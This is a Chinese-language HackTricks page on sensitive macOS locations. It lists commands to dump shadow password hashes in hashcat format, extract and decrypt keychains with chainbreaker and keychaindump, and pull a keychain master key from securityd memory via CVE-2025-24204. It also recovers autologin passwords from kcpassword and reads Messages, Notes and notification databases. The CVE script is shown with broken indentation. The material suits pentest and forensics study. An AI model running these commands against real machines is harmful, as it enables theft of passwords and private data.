# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## 密码

### Shadow Passwords

Shadow password 存储在用户配置中，位于 **`/var/db/dslocal/nodes/Default/users/`** 下的 plist 文件里。\
下面这个 oneliner 可用于 dump **关于用户的所有信息**（包括 hash 信息）：
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**像这个脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 或 [**这个脚本**](https://github.com/octomagon/davegrohl.git) 可用于将 hash 转换为 **hashcat** **格式**。

另一个单行命令可以以 hashcat 格式 `-m 7100`（macOS PBKDF2-SHA512）导出所有非服务账户的 creds：
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
获取用户的 `ShadowHashData` 的另一种方法是使用 `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

这个文件**仅在**系统以 **single-user mode** 运行时使用（因此并不常见）。

### Keychain Dump

注意，当使用 security binary 来**dump 已解密的密码**时，会有多个提示要求用户允许此操作。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
在现代 macOS 上，最有意思的 backing stores 通常是 **`~/Library/Keychains/login.keychain-db`** 和 **`/Library/Keychains/System.keychain`**。它们是基于 SQLite 的文件，但明文访问仍然由 **`securityd`** 代为处理：仅窃取原始 DB 主要只能得到元数据和加密 blob，除非你还能恢复用户的密码、`SystemKey`，或者内存中的 master key。

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.

### Keychaindump Overview

一个名为 **keychaindump** 的工具已被开发出来，用于从 macOS keychains 中提取密码，但它在较新的 macOS 版本（如 Big Sur）上存在局限性，正如一段 [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) 所示。使用 **keychaindump** 需要攻击者先获得访问权限并将权限提升到 **root**。该工具利用了这样一个事实：为了方便，keychain 在用户登录后默认会解锁，从而允许应用程序访问它，而无需反复要求用户输入密码。然而，如果用户选择在每次使用后都锁定 keychain，**keychaindump** 就会失效。

**Keychaindump** 的工作方式是针对一个名为 **securityd** 的特定进程；Apple 将其描述为用于授权和加密操作的守护进程，它对于访问 keychain 至关重要。提取过程包括识别一个由用户登录密码派生出的 **Master Key**。这个密钥是读取 keychain 文件所必需的。为了定位 **Master Key**，**keychaindump** 使用 `vmmap` 命令扫描 **securityd** 的内存堆，在标记为 `MALLOC_TINY` 的区域中查找潜在密钥。以下命令用于检查这些内存位置：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
在识别出潜在的 master keys 后，**keychaindump** 会在 heaps 中搜索特定模式（`0x0000000000000018`），这表示 master key 的候选项。要使用这个 key，还需要进一步步骤，包括 deobfuscation，具体可参考 **keychaindump** 的源代码。关注这一领域的分析人员应注意，用于解密 keychain 的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令是：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) 可用于以取证上可靠的方式从 OSX keychain 中提取以下类型的信息：

- 哈希化的 Keychain password，适合用 [hashcat](https://hashcat.net/hashcat/) 或 [John the Ripper](https://www.openwall.com/john/) 破解
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

如果提供 keychain 解锁密码、通过 [volafox](https://github.com/n0fate/volafox) 或 [volatility](https://github.com/volatilityfoundation/volatility) 获取的 master key，或者像 SystemKey 这样的解锁文件，Chainbreaker 还会提供明文密码。

如果没有这些解锁 Keychain 的方法之一，Chainbreaker 仍会显示所有其他可用信息。

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **使用 SystemKey 转储 keychain keys（包含 passwords）**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **导出 keychain keys（包含密码）并破解 hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **通过内存转储导出 keychain 密钥（含密码）**

[按照以下步骤](../index.html#dumping-memory-with-osxpmem)执行 **内存转储**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用用户密码转储 keychain 密钥（包含密码）**

如果你知道用户的密码，你可以用它来**转储并解密属于该用户的 keychain**。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### 通过 `gcore` entitlement 获取 Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia) 随 `/usr/bin/gcore` 一起发布了 **`com.apple.system-task-ports.read`** entitlement，因此任何本地管理员（或恶意签名应用）都可以转储 **任何进程内存，即使 SIP/TCC 已启用**。转储 `securityd` 会以明文泄露 **Keychain master key**，并让你在不知道用户密码的情况下解密 `login.keychain-db`。

**在易受攻击版本（15.0–15.2）上的快速复现：**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
将提取出的 hex key 传给 Chainbreaker（`--key <hex>`）以解密 login keychain。Apple 已在 **macOS 15.3+** 中移除了该 entitlement，因此这只适用于未打补丁的 Sequoia 构建，或保留了易受攻击二进制文件的系统。

### kcpassword

**kcpassword** 文件是一个保存 **用户登录密码** 的文件，但前提是系统所有者已**启用自动登录**。因此，用户会在不被要求输入密码的情况下自动登录（这并不太安全）。

密码存储在 **`/etc/kcpassword`** 文件中，并与密钥 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 进行 xored。如果用户密码比密钥更长，则会重复使用该密钥。\
这使得密码很容易恢复，例如可以使用像 [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d) 这样的脚本。

## Databases 中的 Interesting Information

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

在 **Sequoia** 之前，通常可以在 **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** 找到 Notification Center 存储。在 **Sequoia+** 中，Apple 将其移动到了受 TCC 保护的 group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**。

大部分有价值的信息都存储在 **blob** 列中，所以你需要提取这些内容并将其转换为人类可读的格式（`plutil -p -`、`strings`，或一个小型解析器）。快速分类示例：
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### 最近的隐私问题（NotificationCenter DB）

- 在 macOS **14.7–15.1** 中，Apple 将 banner 内容存储在 `db2/db` SQLite 中，但没有进行适当的脱敏。CVE **CVE-2024-44292/44293/40838/54504** 允许任何本地用户只需打开 DB 就能读取其他用户的通知文本（没有 TCC prompt）。
- Apple 通过将 DB 移动到 `group.com.apple.usernoted`，并在更新的 Sequoia 版本中用 TCC 保护它来缓解这个问题，因此在当前系统上，通常需要正确的用户上下文或一个 TCC bypass 才能读取它。
- 在旧版终端上，如果你想保留这些 artefacts，在更新或重启之前要一起复制 `db`、`db-wal` 和 `db-shm` 文件。

### Notes

用户的 **notes** 可以在 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` 中找到
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
如果上面的 one-liner 太嘈杂，可以导出 `ZICNOTEDATA.ZDATA`，对其进行 gunzip，然后解析 protobuf：这通常比直接在 SQLite 上运行 `strings` 更可靠。

### Background Tasks / Login Items

自 **Ventura** 起，用户批准的 login items 和若干 background tasks 会被记录在 **BTM** 存储中，例如 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** 和带版本号的系统缓存 **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**。

这些文件可用于快速识别 persistence、helper tools，以及一些由 MDM 管理的 background items：
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
For the persistence angle and BTM internals, check [the auto-start locations page](../../macos-auto-start-locations.md#login-items) and [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

在 macOS 应用中，preferences 位于 **`$HOME/Library/Preferences`**，在 iOS 中位于 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`。

在 macOS 中，可以使用 cli 工具 **`defaults`** 来 **modify the Preferences file**。

**`/usr/sbin/cfprefsd`** 声称 XPC services `com.apple.cfprefsd.daemon` 和 `com.apple.cfprefsd.agent`，并且可以被调用来执行诸如 modify preferences 之类的操作。

## OpenDirectory permissions.plist

文件 `/System/Library/OpenDirectory/permissions.plist` 包含应用于 node attributes 的 permissions，并受 SIP 保护。\
此文件按 UUID（而不是 uid）向特定用户授予权限，因此他们能够访问特定的敏感信息，例如 `ShadowHashData`、`HeimdalSRPKey` 和 `KerberosKeys` 等：
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## 系统通知

### Darwin 通知

通知的主守护进程是 **`/usr/sbin/notifyd`**。为了接收通知，客户端必须通过 `com.apple.system.notification_center` Mach 端口注册（使用 `sudo lsmp -p <pid notifyd>` 检查它们）。该守护进程可通过文件 `/etc/notify.conf` 进行配置。

通知使用的名称是唯一的反向 DNS 命名，当向其中之一发送通知时，已表明可以处理它的客户端会收到它。

可以通过向 notifyd 进程发送 SIGUSR2 信号并读取生成的文件 `/var/run/notifyd_<pid>.status` 来转储当前状态（并查看所有名称）：
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center** 的主二进制文件是 **`/usr/sbin/distnoted`**，它是另一种发送通知的方式。它暴露了一些 XPC services，并会执行一些检查来尝试验证客户端。

### Apple Push Notifications (APN)

在这种情况下，applications 可以注册 **topics**。客户端会通过 **`apsd`** 连接 Apple 的 servers 来生成一个 token。\
然后，providers 也会生成一个 token，并能够连接 Apple 的 servers 向客户端发送 messages。这些 messages 会被 **`apsd`** 本地接收，然后它会把通知转发给等待它的 application。

preferences 位于 `/Library/Preferences/com.apple.apsd.plist`。

macOS 中有一个本地 messages database，位于 `/Library/Application\ Support/ApplePushService/aps.db`，iOS 中位于 `/var/mobile/Library/ApplePushService`。它有 3 个 tables：`incoming_messages`、`outgoing_messages` 和 `channel`。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
也可以使用以下方式获取有关 daemon 和 connections 的信息：
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## 用户通知

这些是用户应该在屏幕上看到的通知：

- **`CFUserNotification`**：这些 API 提供了一种在屏幕上显示带有消息的弹窗的方法。
- **The Bulletin Board**：这在 iOS 中显示一个横幅，随后会消失，并会存储在 Notification Center 中。
- **`NSUserNotificationCenter`**：这是 MacOS 中的 iOS bulletin board。 在较旧的 macOS 版本中，数据库通常位于 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`；在 Sequoia+ 中，它被移动到了 `~/Library/Group Containers/group.com.apple.usernoted/db2/db`。

## 参考资料

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
